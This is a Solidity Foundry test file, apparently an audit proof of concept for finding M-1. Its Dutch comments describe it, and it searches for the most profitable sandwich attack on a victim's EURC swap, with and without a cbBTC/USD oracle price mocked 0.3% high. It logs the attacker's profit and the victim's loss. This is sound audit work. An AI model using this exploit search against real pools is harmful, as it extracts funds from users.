// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;
import {console} from "forge-std/Test.sol";
import {OracleSandwichTest} from "./OracleSandwich.t.sol";
import {IAggregatorV3} from "src/interfaces/IAggregatorV3.sol";

/// @notice M-1: beste sandwich-winst per rungrootte, met en zonder cbBTC/USD-feed 0,3% te hoog (binnen de deviation-drempel).
/// @dev Draaien: cp audit/2026-09-16/poc/OracleLagSandwich.t.sol test/ && ~/.foundry/bin/forge test --match-contract OracleLagSandwichTest -vv
contract OracleLagSandwichTest is OracleSandwichTest {
    function _grid(uint256 victimEurc, int256 lagBpsTimes10) internal {
        if (lagBpsTimes10 != 0) {
            (uint80 a, int256 ans, uint256 s, uint256 u, uint80 b) = IAggregatorV3(FEED_CBBTC_USD).latestRoundData();
            vm.mockCall(FEED_CBBTC_USD, abi.encodeWithSelector(IAggregatorV3.latestRoundData.selector),
                abi.encode(a, ans * (100000 + lagBpsTimes10) / 100000, s, u, b));
        }
        console.log("oracle", r.quote(), "spot", r.spot());
        uint256 snap0 = vm.snapshotState();
        (bool okB,, uint256 fair) = _run(victimEurc, 100, 0);
        vm.revertToState(snap0);
        console.log("run(EURC 6dec)", victimEurc * 8 / 10, "baseline ok", okB);
        int256 best; uint256 bestPush; uint256 bestLoss;
        for (uint256 push = 250e6; push <= 20_000e6; push += 250e6) {
            uint256 snap = vm.snapshotState();
            (bool ok, int256 pnl, uint256 btc) = _run(victimEurc, 100, push);
            if (ok && pnl > best) { best = pnl; bestPush = push; bestLoss = fair - btc; }
            vm.revertToState(snap);
        }
        console.log("best push", bestPush, "victim loss sats", bestLoss);
        console.logInt(best);
    }
    function test_poc_noLag_2500() public { _grid(3_125e6, 0); }
    function test_poc_noLag_4000() public { _grid(5_000e6, 0); }
    function test_poc_noLag_5000() public { _grid(6_250e6, 0); }
    function test_poc_lag30_2500() public { _grid(3_125e6, 300); }
    function test_poc_lag30_5000() public { _grid(6_250e6, 300); }
    function test_poc_lag30_8000() public { _grid(10_000e6, 300); }
}
